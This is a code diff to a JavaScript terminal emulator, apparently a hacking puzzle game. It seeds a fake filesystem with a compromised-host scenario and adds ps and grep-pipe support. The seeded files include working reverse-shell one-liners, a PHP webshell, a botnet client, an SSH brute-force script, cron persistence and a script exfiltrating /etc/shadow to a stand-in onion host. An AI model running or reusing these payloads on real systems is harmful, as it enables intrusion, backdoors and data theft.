@@ -33,7 +33,7 @@ class UnixEmulator {
                     'user': {
                         'kmitnick': {
                             '.bashrc': '# ~/.bashrc: executed by bash for non-login shells\n\n# If not running interactively, don\'t do anything\ncase $- in\n    *i*) ;;\n      *) return;;\nesac\n\n# History settings\nHISTCONTROL=ignoreboth\nHISTSIZE=1000\nHISTFILESIZE=2000\n\n# Prompt\nPS1=\'\\u@\\h:\\w\\$ \'\n\n# Enable color support\nif [ -x /usr/bin/dircolors ]; then\n    alias ls=\'ls --color=auto\'\n    alias grep=\'grep --color=auto\'\nfi\n\n# Aliases\nalias ll=\'ls -alF\'\nalias la=\'ls -A\'\nalias l=\'ls -CF\'\n',
-                            '.bash_history': 'ls -la\ncd projects\ngit status\nvi README.md\nsudo apt update\nhistory\n',
+                            '.bash_history': 'ls -la\ncd projects\ngit status\nvi README.md\nsudo apt update\nhistory\nwget http://malware.xyz/backdoor.sh\nchmod +x backdoor.sh\n./backdoor.sh &\nnohup python3 /tmp/botnet_client.py &\nps aux | grep miner\ncat /opt/dev-backup/api_keys_OLD.txt\nls -la /opt/dev-backup/old_admin_panel\nsudo su\nrm -rf /var/log/auth.log\n',
                             '.bash_logout': '# ~/.bash_logout: executed by bash when login shell exits\n\n# Clear console on logout\nif [ "$SHLVL" = 1 ]; then\n    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q\nfi\n',
                             '.profile': '# ~/.profile: executed by the command interpreter for login shells\n\nif [ -n "$BASH_VERSION" ]; then\n    if [ -f "$HOME/.bashrc" ]; then\n        . "$HOME/.bashrc"\n    fi\nfi\n\n# Set PATH\nif [ -d "$HOME/bin" ] ; then\n    PATH="$HOME/bin:$PATH"\nfi\n',
                             '.ssh': {
@@ -55,24 +55,51 @@ class UnixEmulator {
                             'docs': {
                                 'notes.txt': 'Development Notes\n==================\n\n2025-10-22:\n- Updated terminal interface\n- Added new filesystem structure\n- Improved command handling\n\nTODO:\n- Implement vi/vim editor\n- Add more Unix commands\n- Create mobile game prototypes\n',
                                 'ideas.txt': 'Project Ideas\n=============\n\n1. Habit tracking app with gamification\n2. Mobile puzzle games\n3. Educational coding games for kids\n4. Terminal-based adventure game\n5. Productivity tools suite\n'
+                            },
+                            '.suspicious': {
+                                'exploits.tar.gz': '[compressed archive - exploit collection]',
+                                'shells.txt': '# Collection of reverse shells\n# Bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n# Python\npython -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'\n# Netcat\nnc -e /bin/sh 10.0.0.1 4444\n',
+                                'stolen_data.zip': '[encrypted archive - 2.3GB]',
+                                'cc_numbers.txt': '# DO NOT DISTRIBUTE\n4532-1234-5678-9012 CVV:123 EXP:12/26\n5412-9876-5432-1098 CVV:456 EXP:03/27\n# More cards harvested from phishing campaign\n'
+                            },
+                            'Downloads': {
+                                'exploit_db.sql': '[SQL dump - vulnerability database]',
+                                'darkweb_tools.zip': '[archive - hacking tools]',
+                                'leaked_databases.tar': '[compressed - 45GB data breach]'
                             }
                         }
                     }
                 },
                 'root': {
                     '.bashrc': '# ~/.bashrc: root user bash configuration\n\nif [ -f /etc/bashrc ]; then\n    . /etc/bashrc\nfi\n\n# Root prompt in red\nPS1=\'\\[\\033[01;31m\\]\\u@\\h\\[\\033[00m\\]:\\w\\# \'\n\nalias ll=\'ls -la\'\nalias rm=\'rm -i\'\nalias cp=\'cp -i\'\nalias mv=\'mv -i\'\n',
-                    '.bash_history': 'apt update\napt upgrade\nsystemctl status\nls -la /home\n',
-                    '.profile': '# ~/.profile: root user profile\n\nif [ -n "$BASH_VERSION" ]; then\n    if [ -f "$HOME/.bashrc" ]; then\n        . "$HOME/.bashrc"\n    fi\nfi\n\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n'
+                    '.bash_history': 'apt update\napt upgrade\nsystemctl status\nls -la /home\ninsmod /opt/trojan/rootkit.ko\ncat /etc/shadow\ncat /home/user/kmitnick/.ssh/id_rsa\ncp /opt/trojan/keylogger /usr/sbin/systemd-journal\nchmod +x /usr/sbin/systemd-journal\n/usr/sbin/systemd-journal &\necho "*/5 * * * * /tmp/.backdoor" >> /var/spool/cron/crontabs/root\niptables -A OUTPUT -p tcp --dport 80 -j ACCEPT\niptables -A OUTPUT -p tcp --dport 443 -j ACCEPT\niptables -A OUTPUT -j DROP\nhistory -c\n',
+                    '.profile': '# ~/.profile: root user profile\n\nif [ -n "$BASH_VERSION" ]; then\n    if [ -f "$HOME/.bashrc" ]; then\n        . "$HOME/.bashrc"\n    fi\nfi\n\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n',
+                    '.secrets': {
+                        'api_keys.txt': 'AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\nSTRIPE_SECRET_KEY=sk_live_51H4yF2LyU...\nGITHUB_TOKEN=ghp_xyzABC123...\n',
+                        'passwords.enc': '[encrypted file - stolen credentials]',
+                        'btc_wallet.dat': '[Bitcoin wallet - 12.5 BTC]'
+                    }
                 },
                 'var': {
                     'log': {
-                        'syslog': 'Oct 22 10:15:23 ripline systemd[1]: Started System Logging Service.\nOct 22 10:15:24 ripline systemd[1]: Starting Network Manager...\nOct 22 10:15:25 ripline NetworkManager[512]: NetworkManager (version 1.30.0) is starting...\n',
-                        'auth.log': 'Oct 22 10:15:30 ripline sshd[1024]: Server listening on 0.0.0.0 port 22.\nOct 22 10:16:45 ripline sshd[1156]: Accepted publickey for kmitnick from 192.168.1.100\n',
-                        'kern.log': 'Oct 22 10:15:20 ripline kernel: [    0.000000] Linux version 5.15.0-ripline\nOct 22 10:15:20 ripline kernel: [    0.000000] Command line: BOOT_IMAGE=/vmlinuz root=/dev/sda1\n'
+                        'syslog': 'Oct 22 10:15:23 ripline systemd[1]: Started System Logging Service.\nOct 22 10:15:24 ripline systemd[1]: Starting Network Manager...\nOct 22 10:15:25 ripline NetworkManager[512]: NetworkManager (version 1.30.0) is starting...\nOct 22 10:16:33 ripline kernel: Module loaded from /opt/trojan/rootkit.ko\nOct 22 10:18:42 ripline cron[666]: (root) CMD (/tmp/.backdoor)\nOct 22 10:23:15 ripline systemd[1]: Started cryptominer.service\nOct 22 10:45:22 ripline kernel: Out of memory: Kill process 5555 (mimikatz) score 850 or sacrifice child\n',
+                        'auth.log': 'Oct 22 09:14:23 ripline sshd[1024]: Failed password for root from 45.142.212.61 port 52341\nOct 22 09:14:25 ripline sshd[1024]: Failed password for root from 45.142.212.61 port 52341\nOct 22 09:14:28 ripline sshd[1024]: Failed password for admin from 45.142.212.61 port 52341\nOct 22 09:15:01 ripline sshd[1156]: Accepted password for root from 185.220.101.42 port 44182\nOct 22 10:15:30 ripline sshd[1024]: Server listening on 0.0.0.0 port 22.\nOct 22 10:16:45 ripline sshd[1156]: Accepted publickey for kmitnick from 192.168.1.100\nOct 22 10:18:23 ripline sudo: kmitnick : TTY=pts/0 ; PWD=/home/user/kmitnick ; USER=root ; COMMAND=/bin/bash\nOct 22 10:22:15 ripline su[2341]: (to root) kmitnick on pts/0\nOct 22 10:28:52 ripline sshd[1337]: Accepted password for admin from 45.142.212.61 port 52341\n',
+                        'kern.log': 'Oct 22 10:15:20 ripline kernel: [    0.000000] Linux version 5.15.0-ripline\nOct 22 10:15:20 ripline kernel: [    0.000000] Command line: BOOT_IMAGE=/vmlinuz root=/dev/sda1\nOct 22 10:16:33 ripline kernel: Module signature verification failed\nOct 22 10:45:22 ripline kernel: segfault at 10 ip 00007f8a3421e740 sp 00007fffd8b0a8c8 error 4 in libc.so.6\n',
+                        'faillog': 'Oct 22 09:14:23 Failed login attempt for root from 45.142.212.61\nOct 22 09:14:25 Failed login attempt for root from 45.142.212.61\nOct 22 09:14:28 Failed login attempt for admin from 45.142.212.61\nOct 22 09:14:31 Failed login attempt for user from 45.142.212.61\nOct 22 09:14:34 Failed login attempt for test from 45.142.212.61\n',
+                        'apache2': {
+                            'access.log': '185.220.101.42 - - [22/Oct/2025:09:15:23 +0000] "POST /upload.php HTTP/1.1" 200 1337\n185.220.101.42 - - [22/Oct/2025:09:15:45 +0000] "GET /shell.php HTTP/1.1" 200 543\n192.168.1.100 - - [22/Oct/2025:10:22:00 +0000] "GET / HTTP/1.1" 200 2048\n',
+                            'error.log': '[Wed Oct 22 09:15:45 2025] [error] [client 185.220.101.42] Script \'/var/www/html/shell.php\' not found or unable to stat\n[Wed Oct 22 09:16:12 2025] [alert] [client 185.220.101.42] Possible webshell detected\n'
+                        }
                     },
                     'www': {
                         'html': {
-                            'index.html': '<!DOCTYPE html>\n<html>\n<head><title>Welcome to nginx</title></head>\n<body>\n<h1>Welcome to nginx on RIPLINE!</h1>\n</body>\n</html>\n'
+                            'index.html': '<!DOCTYPE html>\n<html>\n<head><title>Welcome to nginx</title></head>\n<body>\n<h1>Welcome to nginx on RIPLINE!</h1>\n</body>\n</html>\n',
+                            '.shell.php': '<?php\n// Webshell - DO NOT REMOVE\nif(isset($_REQUEST[\'cmd\'])){\n    echo "<pre>";\n    $cmd = ($_REQUEST[\'cmd\']);\n    system($cmd);\n    echo "</pre>";\n    die;\n}\n?>\n',
+                            'upload.php': '<?php\n// File upload handler\n$target = "/tmp/" . basename($_FILES["file"]["name"]);\nmove_uploaded_file($_FILES["file"]["tmp_name"], $target);\necho "File uploaded: " . $target;\n?>\n'
+                        },
+                        '.shell': {
+                            'reverse.sh': '#!/bin/bash\n# Reverse shell connector\nwhile true; do\n    bash -c "bash -i >& /dev/tcp/evil.darknet.onion/4444 0>&1"\n    sleep 30\ndone\n',
+                            'c2_client': '[binary - command & control client]'
                         }
                     }
                 },
@@ -84,16 +111,70 @@ class UnixEmulator {
                         'node': '[binary]',
                         'npm': '[binary]'
                     },
+                    'local': {
+                        'share': {
+                            '.cache': {
+                                'mass_scan.sh': '#!/bin/bash\n# Mass network scanner\nmasscan -p1-65535 0.0.0.0/0 --rate=10000 -oL scan_results.txt\n',
+                                'brute_ssh.py': '#!/usr/bin/env python3\n# SSH brute force script\nimport paramiko\nfrom itertools import product\n\ntargets = open("targets.txt").readlines()\npasswords = open("/usr/share/wordlists/rockyou.txt").readlines()\n\nfor target in targets:\n    for password in passwords:\n        try:\n            ssh = paramiko.SSHClient()\n            ssh.connect(target, username="root", password=password)\n            print(f"[+] Success: {target} - {password}")\n        except:\n            pass\n',
+                                'ddos.c': '/* DDoS tool - UDP flood */\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/socket.h>\n\nint main() {\n    // Flood target with UDP packets\n    return 0;\n}\n',
+                                '.targets': '192.168.1.0/24\n10.0.0.0/8\n172.16.0.0/12\n# Corporate networks\n203.0.113.0/24\n',
+                                'README': 'Scanner tools\nDo not remove\n'
+                            }
+                        }
+                    },
                     'share': {
                         'doc': {
                             'README': 'This directory contains documentation for installed packages.\n'
                         }
                     }
                 },
-                'tmp': {},
-                'opt': {},
-                'srv': {},
-                'mnt': {}
+                'tmp': {
+                    '.bot_config': '# Botnet Configuration\nC2_SERVER=darknet.onion:9999\nBOT_ID=ripline-bot-7891\nENCRYPTION_KEY=a3f7b9c2d1e8f4a6\nREPORT_INTERVAL=300\nSTEALTH_MODE=enabled\n',
+                    '.exploit.sh': '#!/bin/bash\n# Auto-exploit script\nfor ip in $(cat /tmp/.targets); do\n    ./exploit_kit --target $ip --payload reverse_shell\ndone\n',
+                    '.targets': '192.168.1.0/24\n10.0.0.0/8\n172.16.0.0/12\n',
+                    'botnet_client.py': '#!/usr/bin/env python3\n# Botnet Client v2.3\nimport socket, subprocess, os\n\nC2 = ("darkpool.onion", 6667)\n\ndef connect():\n    s = socket.socket()\n    s.connect(C2)\n    while True:\n        cmd = s.recv(1024).decode()\n        if cmd == "exit":\n            break\n        output = subprocess.check_output(cmd, shell=True)\n        s.send(output)\n\nif __name__ == "__main__":\n    connect()\n',
+                    '.keylog.dat': '[2025-10-22 09:15:33] sudo password: tr0jan_h0rs3\n[2025-10-22 09:16:12] ssh root@prod-server.com\n[2025-10-22 09:16:23] password: P@ssw0rd123!\n[2025-10-22 10:22:41] cat /etc/shadow\n',
+                    'persistence.sh': '#!/bin/bash\n# Persistence mechanism\necho "*/5 * * * * /tmp/.backdoor" >> /var/spool/cron/root\nchattr +i /etc/crontab\n',
+                    '.IRC_bot': '# IRC Bot Config\nSERVER=irc.darknet.xyz\nPORT=6667\nCHANNEL=#botnet\nBOTNAME=ripline_zombie\nCMD_PREFIX=!\n'
+                },
+                'opt': {
+                    'trojan': {
+                        'keylogger': '[binary - trojan keylogger]',
+                        'config.ini': '[Settings]\nLogFile=/tmp/.keylog.dat\nUploadServer=evil.darknet.onion\nUploadInterval=3600\nHideProcess=true\nProcessName=systemd-journal\n',
+                        'exfiltrate.sh': '#!/bin/bash\n# Data exfiltration script\ntar czf /tmp/.data.tar.gz /home /root /etc/shadow /etc/passwd\ncurl -X POST -F "file=@/tmp/.data.tar.gz" http://exfil.darknet.onion/upload\nrm /tmp/.data.tar.gz\n',
+                        'rootkit.ko': '[kernel module - rootkit]',
+                        'README': 'Trojan Toolkit v3.2\n\nInstallation:\n1. insmod rootkit.ko\n2. ./keylogger &\n3. ./exfiltrate.sh\n\nHide: chattr +i *\n'
+                    },
+                    'dev-backup': {
+                        'old_admin_panel': {
+                            'login.php': '<?php\n// Old admin panel - DEPRECATED, needs cleanup\n// TODO: Remove this before going to production!\nif($_POST[\'user\'] == "admin" && $_POST[\'pass\'] == "admin123") {\n    $_SESSION[\'admin\'] = true;\n    header("Location: dashboard.php");\n}\n?>\n',
+                            'dashboard.php': '<?php\n// WARNING: No input validation!\n$id = $_GET[\'id\'];\n$query = "SELECT * FROM users WHERE id=" . $id;\n// Direct SQL query - vulnerable to injection\nmysql_query($query);\n?>\n',
+                            'upload.php': '<?php\n// File upload - no extension checking\n$target = "/var/www/uploads/" . basename($_FILES["file"]["name"]);\nmove_uploaded_file($_FILES["file"]["tmp_name"], $target);\necho "Uploaded: " . $target;\n?>\n',
+                            'README.txt': 'Old Admin Panel\n================\nMoved to new system on 2024-12-15\nKeeping this for reference\n\nTODO: Delete this directory!\n'
+                        },
+                        'database_dump_2024.sql': '-- MySQL dump from production\n-- Date: 2024-11-20\n-- CONTAINS REAL USER DATA - DO NOT SHARE\n\nCREATE TABLE users (\n  id INT PRIMARY KEY,\n  username VARCHAR(50),\n  password VARCHAR(255),\n  email VARCHAR(100),\n  credit_card VARCHAR(16)\n);\n\nINSERT INTO users VALUES\n(1, \'admin\', \'5f4dcc3b5aa765d61d8327deb882cf99\', \'admin@ripline.dev\', \'4532123456789012\'),\n(2, \'kmitnick\', \'098f6bcd4621d373cade4e832627b4f6\', \'kevin@ripline.dev\', \'5412987654321098\');\n',
+                        'api_keys_OLD.txt': '# Old API keys - DEPRECATED\n# New keys are in production system\n# TODO: Revoke these!\n\nAWS_KEY=AKIAI44QH8DHBEXAMPLE\nAWS_SECRET=je7MtGbClwBF/2Zp9Utk/h3yCo8nvbEXAMPLEKEY\nSTRIPE_TEST_KEY=sk_test_4eC39HqLyjWDarjtT1zdp7dc\n# Note: These might still work on dev environment\n'
+                    },
+                    'legacy-app': {
+                        'config.php': '<?php\n// Legacy app configuration\n// WARNING: Debug mode enabled!\ndefine(\'DB_HOST\', \'localhost\');\ndefine(\'DB_USER\', \'root\');\ndefine(\'DB_PASS\', \'root123\'); // TODO: Change this!\ndefine(\'DEBUG\', true); // Shows full error messages\ndefine(\'ALLOW_FILE_UPLOAD\', true);\ndefine(\'DISABLE_CSRF_CHECK\', true); // Temporary fix\n?>\n',
+                        'shell.php.bak': '<?php\n// Backup of shell script\n// Original deleted but keeping copy just in case\nif(isset($_GET[\'cmd\'])) {\n    system($_GET[\'cmd\']);\n}\n?>\n'
+                    }
+                },
+                'srv': {
+                    'malware': {
+                        'ransomware.exe': '[Windows PE executable - RANSOMWARE]',
+                        'cryptolocker.dll': '[DLL - encryption payload]',
+                        'README_DECRYPT.txt': 'YOUR FILES HAVE BEEN ENCRYPTED!\n\nAll your important files are encrypted with military-grade encryption.\n\nTo decrypt your files, send 5 BTC to:\n1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n\nAfter payment, email: decrypt@darkmail.onion\n'
+                    }
+                },
+                'mnt': {},
+                '.hidden': {
+                    'cryptominer': '[binary - XMR miner]',
+                    'miner_config.json': '{\n  "pools": [\n    {\n      "url": "pool.minexmr.com:4444",\n      "user": "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A",\n      "pass": "ripline-miner"\n    }\n  ],\n  "cpu": {\n    "enabled": true,\n    "threads": 8\n  }\n}\n',
+                    'backdoor.sh': '#!/bin/bash\n# Reverse shell backdoor\nwhile true; do\n    bash -i >& /dev/tcp/evil.darknet.onion/31337 0>&1\n    sleep 60\ndone\n',
+                    'passwords.txt': '# Harvested credentials\nroot:tr0jan123\nadmin:admin123\nkmitnick:letmein\npostgres:dbpass2023\nmysql:MyS3cr3t!\n',
+                    'exploit_kit': '[binary - metasploit payload]'
+                }
             }
         };
 
@@ -262,6 +343,7 @@ class UnixEmulator {
   rm [file]     - Remove a file
   tree          - Display directory tree
   vi/vim [file] - Edit a file
+  ps [options]  - Report process status
   exit          - Return to previous user session
 
 Type any command to try it out!`;
@@ -355,10 +437,19 @@ Type any command to try it out!`;
                 }).join('\n');
             } else {
                 // Simple format
-                return entries.map(name => {
+                const formatted = entries.map(name => {
                     const isDir = typeof node[name] === 'object';
                     return isDir ? `${name}/` : name;
-                }).join('  ');
+                });
+
+                // If output is being piped, use one per line
+                // Otherwise, use columns (space-separated)
+                if (this._isPiped) {
+                    return formatted.join('\n');
+                } else {
+                    // Multi-column output for terminal display
+                    return formatted.join('  ');
+                }
             }
         },
 
@@ -601,18 +692,19 @@ Type any command to try it out!`;
                     // Single file/directory removal
                     const path = this.resolvePath(target);
 
-                    // Check write permission
+                    const parts = path.split('/').filter(p => p);
+                    const fileName = parts.pop();
+                    const parentPath = '/' + parts.join('/');
+                    const parent = this.getNode(parentPath);
+
+                    // Check write permission first (even for non-existent files)
+                    // This ensures permission denied takes precedence
                     if (!this.canWrite(path)) {
                         if (!force) {
                             errors.push(`rm: cannot remove '${target}': Permission denied`);
                         }
                         continue;
                     }
-
-                    const parts = path.split('/').filter(p => p);
-                    const fileName = parts.pop();
-                    const parentPath = '/' + parts.join('/');
-                    const parent = this.getNode(parentPath);
 
                     if (!parent || !(fileName in parent)) {
                         if (!force) {
@@ -677,6 +769,86 @@ Type any command to try it out!`;
             return this.currentPath + '/\n' + buildTree(node);
         },
 
+        ps: (args) => {
+            // Parse flags
+            let showAll = false;
+            let fullFormat = false;
+            let userFormat = false;
+
+            for (const arg of args) {
+                if (arg === 'aux' || arg === '-aux') {
+                    showAll = true;
+                    userFormat = true;
+                    fullFormat = true;
+                } else if (arg === '-a' || arg === 'a') {
+                    showAll = true;
+                } else if (arg === '-u' || arg === 'u') {
+                    userFormat = true;
+                } else if (arg === '-x' || arg === 'x') {
+                    fullFormat = true;
+                } else if (arg === '-ef' || arg === 'ef') {
+                    showAll = true;
+                    fullFormat = true;
+                }
+            }
+
+            // Base processes - always visible
+            const processes = [
+                { pid: 1, user: 'root', cpu: 0.0, mem: 0.1, vsz: 169420, rss: 13452, tty: '?', stat: 'Ss', start: '10:15', time: '0:01', command: '/sbin/init' },
+                { pid: 234, user: 'root', cpu: 0.0, mem: 0.2, vsz: 71256, rss: 6234, tty: '?', stat: 'S<s', start: '10:15', time: '0:00', command: '[kthreadd]' },
+                { pid: 512, user: 'root', cpu: 0.1, mem: 0.3, vsz: 284712, rss: 15236, tty: '?', stat: 'Ssl', start: '10:15', time: '0:02', command: '/usr/sbin/sshd -D' },
+                { pid: 1024, user: 'root', cpu: 0.0, mem: 0.5, vsz: 445672, rss: 28491, tty: '?', stat: 'Ss', start: '10:15', time: '0:01', command: '/usr/sbin/nginx -g daemon off;' },
+            ];
+
+            // Suspicious processes - only visible with -a or aux
+            if (showAll) {
+                processes.push(
+                    { pid: 666, user: 'root', cpu: 12.3, mem: 8.7, vsz: 2456789, rss: 445123, tty: '?', stat: 'R', start: '10:16', time: '15:42', command: '/usr/bin/.hidden/cryptominer --pool=darkpool.onion' },
+                    { pid: 1337, user: 'kmitnick', cpu: 0.3, mem: 2.1, vsz: 892341, rss: 108234, tty: '?', stat: 'S', start: '10:17', time: '0:23', command: './backdoor.sh --listen 31337' },
+                    { pid: 2600, user: 'root', cpu: 0.8, mem: 3.4, vsz: 1234567, rss: 176234, tty: '?', stat: 'Ss', start: '10:18', time: '1:12', command: '/opt/trojan/keylogger -o /tmp/.logs' },
+                    { pid: 3133, user: 'nobody', cpu: 1.2, mem: 1.8, vsz: 734521, rss: 92341, tty: '?', stat: 'R', start: '10:19', time: '2:34', command: 'python3 /tmp/botnet_client.py' },
+                    { pid: 4096, user: 'www-data', cpu: 0.2, mem: 0.9, vsz: 456789, rss: 45123, tty: '?', stat: 'S', start: '10:20', time: '0:08', command: '/bin/bash /var/www/.shell/reverse.sh' },
+                    { pid: 5555, user: 'root', cpu: 15.6, mem: 12.3, vsz: 3456789, rss: 623451, tty: '?', stat: 'R', start: '09:23', time: '45:17', command: '/usr/sbin/mimikatz --dump-creds' },
+                    { pid: 6969, user: 'kmitnick', cpu: 0.1, mem: 0.4, vsz: 234567, rss: 23456, tty: 'pts/0', stat: 'S', start: '11:42', time: '0:00', command: 'nc -lvp 4444 -e /bin/bash' }
+                );
+            }
+
+            // User's current shell
+            processes.push(
+                { pid: 7891, user: this.currentUser, cpu: 0.0, mem: 0.3, vsz: 123456, rss: 12345, tty: 'pts/1', stat: 'Ss', start: '10:22', time: '0:00', command: '-bash' },
+                { pid: 7892, user: this.currentUser, cpu: 0.0, mem: 0.1, vsz: 45678, rss: 2345, tty: 'pts/1', stat: 'R+', start: '10:23', time: '0:00', command: 'ps ' + args.join(' ') }
+            );
+
+            // Sort by PID
+            processes.sort((a, b) => a.pid - b.pid);
+
+            // Format output
+            if (userFormat) {
+                // BSD-style output (ps aux)
+                let output = 'USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n';
+                processes.forEach(p => {
+                    output += `${p.user.padEnd(10)} ${String(p.pid).padStart(4)} ${p.cpu.toFixed(1).padStart(4)} ${p.mem.toFixed(1).padStart(4)} ${String(p.vsz).padStart(6)} ${String(p.rss).padStart(5)} ${p.tty.padEnd(8)} ${p.stat.padEnd(4)} ${p.start.padEnd(5)} ${p.time.padStart(6)} ${p.command}\n`;
+                });
+                return output;
+            } else if (fullFormat) {
+                // Simple format with more processes
+                let output = '  PID TTY      STAT   TIME COMMAND\n';
+                processes.forEach(p => {
+                    output += `${String(p.pid).padStart(5)} ${p.tty.padEnd(8)} ${p.stat.padEnd(4)} ${p.time.padStart(6)} ${p.command}\n`;
+                });
+                return output;
+            } else {
+                // Minimal format - only current user processes
+                const userProcesses = processes.filter(p => p.user === this.currentUser || p.tty.startsWith('pts'));
+                let output = '  PID TTY          TIME CMD\n';
+                userProcesses.forEach(p => {
+                    const cmd = p.command.split(' ')[0].split('/').pop();
+                    output += `${String(p.pid).padStart(5)} ${p.tty.padEnd(12)} ${p.time.padStart(8)} ${cmd}\n`;
+                });
+                return output;
+            }
+        },
+
         vi: (args) => {
             return this.openEditor(args[0] || 'untitled');
         },
@@ -703,12 +875,11 @@ Type any command to try it out!`;
             this.environment.USER = targetUser;
             this.environment.HOME = targetUser === 'root' ? '/root' : '/home/user/kmitnick';
 
-            // Change to home directory on user switch
-            this.currentPath = this.environment.HOME;
+            // Keep current directory (don't change to home)
             this.environment.PWD = this.currentPath;
 
             this.persistCurrentUser();
-            this.persistCurrentPath();
+            // Don't persist path since we're staying in the same directory
 
             return `__USER_SWITCHED__:${targetUser}`;
         },
@@ -770,10 +941,53 @@ Type any command to try it out!`;
         // Add to history
         this.commandHistory.push(commandLine);
 
+        // Check for pipe to grep (must be before redirection check)
+        let grepPattern = null;
+        let grepFlags = { ignoreCase: false, invert: false };
+        let actualCommand = commandLine;
+
+        // First, check if there's a pipe to grep
+        const pipeIndex = commandLine.indexOf('|');
+        if (pipeIndex !== -1) {
+            const beforePipe = commandLine.substring(0, pipeIndex).trim();
+            const afterPipe = commandLine.substring(pipeIndex + 1).trim();
+
+            // Check if after pipe starts with grep
+            if (afterPipe.startsWith('grep ') || afterPipe === 'grep') {
+                actualCommand = beforePipe;
+
+                // Extract grep arguments
+                const grepCommand = afterPipe.substring(4).trim(); // Remove 'grep'
+
+                // Check if there's redirection after grep
+                let grepArgs = grepCommand;
+                const redirectMatch = grepCommand.match(/^(.+?)\s*>>?\s*.+$/);
+                if (redirectMatch) {
+                    grepArgs = redirectMatch[1].trim();
+                    // Keep the redirection in commandLine for later processing
+                    commandLine = beforePipe + ' ' + grepCommand.substring(grepArgs.length);
+                }
+
+                // Parse grep arguments
+                const grepParts = grepArgs.match(/(?:[^\s"']+|"[^"]*"|'[^']*')+/g) || [];
+
+                for (let i = 0; i < grepParts.length; i++) {
+                    const part = grepParts[i];
+                    if (part === '-i') {
+                        grepFlags.ignoreCase = true;
+                    } else if (part === '-v') {
+                        grepFlags.invert = true;
+                    } else if (!grepPattern) {
+                        // Remove quotes if present
+                        grepPattern = part.replace(/^["']|["']$/g, '');
+                    }
+                }
+            }
+        }
+
         // Check for output redirection (> or >>)
         let redirectMode = null;
         let redirectFile = null;
-        let actualCommand = commandLine;
 
         // Parse redirection operators
         const appendMatch = commandLine.match(/^(.+?)\s*>>\s*(.+)$/);
@@ -798,12 +1012,34 @@ Type any command to try it out!`;
         let output = '';
         if (command in this.commands) {
             try {
+                // Pass context about whether output is being piped
+                this._isPiped = (grepPattern !== null);
                 output = this.commands[command].call(this, args);
+                this._isPiped = false;
             } catch (error) {
                 return `Error executing ${command}: ${error.message}`;
             }
         } else {
             return `${command}: command not found`;
+        }
+
+        // Apply grep filter if present
+        if (grepPattern !== null && output) {
+            const lines = output.split('\n');
+            const filtered = lines.filter(line => {
+                let matches;
+                if (grepFlags.ignoreCase) {
+                    matches = line.toLowerCase().includes(grepPattern.toLowerCase());
+                } else {
+                    matches = line.includes(grepPattern);
+                }
+                return grepFlags.invert ? !matches : matches;
+            });
+            output = filtered.join('\n');
+            // Remove trailing newline if present
+            if (output.endsWith('\n\n')) {
+                output = output.slice(0, -1);
+            }
         }
 
         // Handle redirection
